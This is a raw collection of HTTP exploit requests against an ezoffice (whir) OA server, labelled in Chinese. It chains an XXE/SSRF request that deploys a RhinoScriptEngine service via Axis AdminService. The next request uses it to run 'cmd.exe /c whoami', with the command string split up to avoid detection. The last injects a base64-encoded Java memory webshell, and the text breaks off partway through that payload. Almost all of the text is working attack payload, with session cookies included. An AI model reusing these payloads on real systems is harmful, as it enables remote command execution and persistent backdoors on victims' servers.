encoding=\"utf-8\"?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM \"http://127.0.0.1:7001/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment\" &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\nPOST /defaultroot/xfservices/./GeneralWeb HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=CE51E9EFA8D671515820825DDE46CE04; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=6E31EDD176A235E4A50A1E32A72D2672x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 6208&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gen=\"http://com.whir.service/GeneralWeb\"&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;gen:OAManager&gt;         &lt;!--type: string--&gt;         &lt;gen:input&gt;&amp;#x3c;&amp;#x3f;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x20;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x22;&amp;#x31;&amp;#x2e;&amp;#x30;&amp;#x22;&amp;#x20;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x6f;&amp;#x64;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x3d;&amp;#x22;&amp;#x75;&amp;#x74;&amp;#x66;&amp;#x2d;&amp;#x38;&amp;#x22;&amp;#x3f;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x44;&amp;#x4f;&amp;#x43;&amp;#x54;&amp;#x59;&amp;#x50;&amp;#x45;&amp;#x20;&amp;#x61;&amp;#x61;&amp;#x61;&amp;#x20;&amp;#x5b;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x30;&amp;#x30;&amp;#x31;&amp;#x2f;&amp;#x64;&amp;#x65;&amp;#x66;&amp;#x61;&amp;#x75;&amp;#x6c;&amp;#x74;&amp;#x72;&amp;#x6f;&amp;#x6f;&amp;#x74;&amp;#x2f;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x73;&amp;#x2f;&amp;#x2e;&amp;#x2f;&amp;#x41;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x53;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x3f;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x68;&amp;#x6f;&amp;#x64;&amp;#x3d;&amp;#x21;&amp;#x2d;&amp;#x2d;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x77;&amp;#x73;&amp;#x64;&amp;#x64;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x77;&amp;#x73;&amp;#x64;&amp;#x64;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x76;&amp;#x69;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x52;&amp;#x68;&amp;#x69;&amp;#x6e;&amp;#x6f;&amp;#x53;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x45;&amp;#x6e;&amp;#x67;&amp;#x69;&amp;#x6e;&amp;#x65;&amp;#x53;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x76;&amp;#x69;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x52;&amp;#x50;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x63;&amp;#x6c;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x4e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2e;&amp;#x73;&amp;#x75;&amp;#x6e;&amp;#x2e;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x2e;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x2e;&amp;#x52;&amp;#x68;&amp;#x69;&amp;#x6e;&amp;#x6f;&amp;#x53;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x45;&amp;#x6e;&amp;#x67;&amp;#x69;&amp;#x6e;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x61;&amp;#x6c;&amp;#x6c;&amp;#x6f;&amp;#x77;&amp;#x65;&amp;#x64;&amp;#x4d;&amp;#x65;&amp;#x74;&amp;#x68;&amp;#x6f;&amp;#x64;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x65;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x4d;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x64;&amp;#x65;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x69;&amp;#x7a;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x2e;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x6f;&amp;#x64;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x2e;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x2e;&amp;#x42;&amp;#x65;&amp;#x61;&amp;#x6e;&amp;#x44;&amp;#x65;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x69;&amp;#x7a;&amp;#x65;&amp;#x72;&amp;#x46;&amp;#x61;&amp;#x63;&amp;#x74;&amp;#x6f;&amp;#x72;&amp;#x79;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x78;&amp;#x2e;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x2e;&amp;#x53;&amp;#x69;&amp;#x6d;&amp;#x70;&amp;#x6c;&amp;#x65;&amp;#x53;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x43;&amp;#x6f;&amp;#x6e;&amp;#x74;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x71;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x53;&amp;#x69;&amp;#x6d;&amp;#x70;&amp;#x6c;&amp;#x65;&amp;#x53;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x43;&amp;#x6f;&amp;#x6e;&amp;#x74;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x69;&amp;#x7a;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x2e;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x6f;&amp;#x64;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x2e;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x2e;&amp;#x42;&amp;#x65;&amp;#x61;&amp;#x6e;&amp;#x53;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x69;&amp;#x7a;&amp;#x65;&amp;#x72;&amp;#x46;&amp;#x61;&amp;#x63;&amp;#x74;&amp;#x6f;&amp;#x72;&amp;#x79;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x75;&amp;#x72;&amp;#x6e;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x62;&amp;#x65;&amp;#x61;&amp;#x6e;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x72;&amp;#x65;&amp;#x67;&amp;#x65;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#x45;&amp;#x6c;&amp;#x65;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x66;&amp;#x61;&amp;#x6c;&amp;#x73;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x4d;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x22;&amp;#x20;&amp;#x3e;&amp;#x0a;&amp;#x5d;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&amp;#x26;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&lt;/gen:input&gt;      &lt;/gen:OAManager&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n\n\n\n\n\n执行命令POST /defaultroot/services/./RhinoScriptEngineService HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=D7AA7CDC820C702A5A45F51AAB4B677A; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=05A06A3BF1E3D38195AB69663E791C25x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 866&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\"&gt;&lt;soapenv:Body&gt;&lt;eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\"&gt;&lt;arg0 xmlns=\"\"&gt;&lt;![CDATA[function test()&#123;    var cmd1 = 'c';    cmd1 += 'm';    cmd1 += 'd';    cmd1 += '.';    cmd1 += 'e';    cmd1 += 'x';    cmd1 += 'e';    var cmd2 = '/';    cmd2 += 'c';    var pb = new java.lang.ProcessBuilder(cmd1,cmd2,'whoami');    var process = pb.start();    var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\\\A').next();    return ret;&#125;   test();]]&gt;&lt;/arg0&gt;&lt;arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\"&gt;&lt;/arg1&gt;&lt;/eval&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n\n\n\n\n\n打内存马POST /defaultroot/services/./RhinoScriptEngineService HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=D7AA7CDC820C702A5A45F51AAB4B677A; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=05A06A3BF1E3D38195AB69663E791C25x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 17184&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\"&gt;&lt;soapenv:Body&gt;&lt;eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\"&gt;&lt;arg0 xmlns=\"\"&gt;&lt;![CDATA[function test()&#123;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try&#123;classLoader.loadClass('org.apache.commons.lang.be.CSVUtil').newInstance();&#125;catch (e)&#123;var clsString = classLoader.loadClass('java.lang.String');var bytecodeBase64 = 'yv66vgAAADEBewEAIm9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL2JlL0NTVlV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQA0b3JnLmFwYWNoZS5jb21tb25zLmxhbmcuU2VydmxldENvbnRleHRXYnFzYmtMaXN0ZW5lcggACAEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAMAQAQamF2YS9sYW5nL1N0cmluZwcADgEL6Eg0c0lBQUFBQUFBQUFKMVhlVnhVMXhYK0xqUHdobUUwY1ZBVWJaTzRzd3dNRWhTRUxBSkNJQUlhSjhFZ01lMWplTURUWVdaNDd3MFIyNWcydFduU3B1bmVOTjJYcExTTmJiV05nMG8xeGk1cDAzMUo5MzF2MnY3ZmY5TDB1Kzg5QmhnRzhkY2Z3MXZ1UGVjNzUzNW51ZmU5OE4vekZ3RnN3NzhGNmhMR2NGaE5xdEVSTFJ4TmpJNG00bVk0cHNhSHd4SE5HSTlwVm1zaWJtbEhyUU1EWStiQWtTN2R0TFM0WmlnUUFxc09xK09xSTlzYVUwMnpLNkVPeWltUHdDWTVkVFJzT2hBelVQdTFzWlJtV3JNZytRSUZOK2x4M2JwRndGTlczaXZnYlUwTWFnTFhkT2x4clNjMU9xQVpkNm9ETVk0RXV4SlJOZGFyR3JwOGR3ZTkxb2h1Q3V6bytuL1cwQlNBQXA4Zlhpd1hXRnZXbFhNMVRkSXBFUlZZdmNpOEJMbFdnaFJUYnBpa2xQVzNsR2ZMTm5GdVFDQ3Z2MFdnYUZBYjR1THNjY0pTdkxOem9VSUFwVmdyWWRjSlhHczR2TzNtdjVHWTBBWUZ0amp1THNadzI3Z1d0MnpYaTgyRkV3SWJyMEtibEx0Mk94a2dYWTNweDZUbDRsbFAyNDVHdGFTbEorSUtObkRoTG1iVW1FaGFpWENybmh3aFBRSStRek9UREFqRGxlMzBpR1Vsd3gyOFpPdzdrdFJTVE0wMENTMXd3K0pLdGdTRlBZbUJ3ekpuYk5kU2xoNExkNnRKQ2VJdVFHRHJrcFp0UWVxc1g1SVpCVlVDbTY4S1QwR1lzYnE2UlN2WUpuRGRsZGVxNEVhQlpmT1dxV0E3aHlLV0dqM0NON2N1Vmd4cjFueFB5R05aK1JXanpwUnJ3RTQvcXRFbzRCL1JaSGIzcUtOMjZjM0dQR0laZW55WXNqZmg1a0xrZ1lWYlNHTWR0bmdtTCtmSmx1ZFMzNFhtSXRSQTFvTmpxbGVOcGJRQWRqdXdiY3o2YkMwRnR6R2JvaXhsVlkremROYk5LOWtSMVlqSWhjU2pXbFA1d1FBNmNic2ZIZGdqVURJOFMzSzdrUmpOTUhMSDB2bm9NSk5OM0tKNUcwQTNldnowZnk4cHRHUGdKdkdHQmVRdlNPTUE3c0IreVVtRThac05jWWRxanRoaHZzdVBYaXozb1pMNW5relIvWWE1Njk4N2NGaUxXazBMUjhvWERnWFFoNE5GMklGK0h6YjdzSlhOS2VYRGE5aE9rMnc5QWFoT0ROaXdmRFJrQjRZVmxDT3lPYXoxQmpBSXJRaDFHS0tmelcwUkgwYmNwcEhWR2hTd1pvdElVbWZjdEZTR1RhQjgwZXpKYmlzQnhERHF4eEdRMit2bkNaaEpMY3JNamhxYXRVZWJpUEJOUVpJcm9hR1dDVXRqM25qTHl2dGJBakJneWdTeG5CNmN3M0N2Yk8zamZvemhQaXJKWFVxS2RqcVNwaFpOR2JvMUVhWVJXM1FDeDZRL3I1dVh1QTRyQ3U1M0hIQjdmbkZacm43L0FON2d4M0c4a1kwc2ExTEJtd1NXeitnNys0NUE2VUtVekpiMFpqemt4d204UmFaaXNWT2grOTBLWFR1anBpZkNMYW1oSWMzUUJwMDU2cjBWYjVNWitDaUxKcmVNZ3Nmc2pxNE95ZzFhWUdWWnp1cCtKOTdseHp2d2JvSEFnR3BxTytwMmExRjdYeS9KRldFWmpmZmlmZExaOTdOcER5YmE5YmdhNDlGQWJxVnk4Z040UW5MN3dRQldvVVNLZlppWkU5ZnVtODJjK1g1azh2eWorSmprNGVQRVlpbXJNVlB1enpteWx2M2lrL2lVcFA5SkZtNW1YNk40UHFscjcxMnkySEswdW93VGsvaU05UG16Ym5kM1puc1NrVlIwcEYzWFlvTnp0dEdubVdqanFyRjladGRiWExiSmtheVozNTFkbTg3Y051ZFd5MVNaSTJKb1F6SEtoRzA0VjVLYnlvb2NSNWJWaTJncFNEUExTUXlqR2xPWkcvYW9RTlVTelgrKzZRRE80cHlNem5udVg3SlhwcEthRVkzWkhlZ3JzaFpPNEVKV3VPWlY1ck4rbk1RbDZwcWExUnlOeWk3cW5BbkxEa3FCeS9pcUgxUDRHcnNRd2JOMnBpdjF4bS9nZWFuNFRjYWUzaHc3SmpQU3psNWo1b3lUZGZxUkJ4QWV6SmpjWmlwZVBhcWIwZXFXNWtqYlROSWJQbnlQR0VNSmR6ZmR2QVJMTS8zZ0IvaWg1T0JIckNISHZsT0pQdnpFS2VodXpScEprUFZkT2ZENkYrRGxpb09EUUZNL3hjK2txWjhMckZsTVNzRXZXVVI2ZkR4eGhHdlltWVBNL3F2azk5ZjRqUisvd204VnJIRjdaYlhjNktwYjdFYmh3eCtjclRORDNwOW8xeUhBaDc5UW82NjJmcUNoZHZ2TyttMDFxalpZczlPSHYxSGpMdTZyVmMzRFBKNzU4QS9TM2FzUHg4WU1ibXYveEhvV254ZEVnWWRYYm03ODhoSHkvR0xmZDl0M0g1OFUrMXJJdHpacUNONVhWMHpobW9yZzM4OGdXaEY4NlF4dXJRais2d3phVDNNcUQzNWVaVjBESmZ4YmpTSStCUncxM3BmWjRQdzBjQ0gzVVZMS3JxbW9uTUxLcFRIWEVtV2RqVm5pNkxtWThta0Zna1FWc2htNjZEZHpnVktxc0tMU1UzbHhDcTg2bFlFcnNGMjZmZzVVWVFhcWtFYlcyRkN2eG5VdTFIWmJrODZmem9MWU5BZENaQ0M0L2VJR0cyTDlESVI0a2hvSzV5NVhwdEYwQ1RYZG9ZcG5jT3M1dE9heHVKNmVmZUZEZXhwZFQrRHhpdEFVOXZXRXp1Rk9nVWJ2TkhyN3BuQ2dNYjgwUDNnM0IrL3g0QUFmRDFWbEh1OHQ5YnJQM3VCckNSTTloMkVQZ3ZwWkpCb0xTZ3Z5cHpIV0o0ZlRTQVgxS1J4TjQvWFR5T3VyU09QQk5CNmV3aU9sQlJVRWZydEFHdTlKNC9FMFBwVEdSOUw0UkdsK0drOGRtRVIrWThFa3ZEMm41VEdJZldvYUc1a2NGM0NKZDQvTlNUdWpBR3psYURuL0toQkdKZW9SNHJtMkNudDRodTdseUFBL3NCT294VGh1eEtNOEVaM2xrV3VhQkY5QUk1RWE4QnlUVUhMYUljOFphQ0hpSmpJWHhtUFlqQzIwVTQr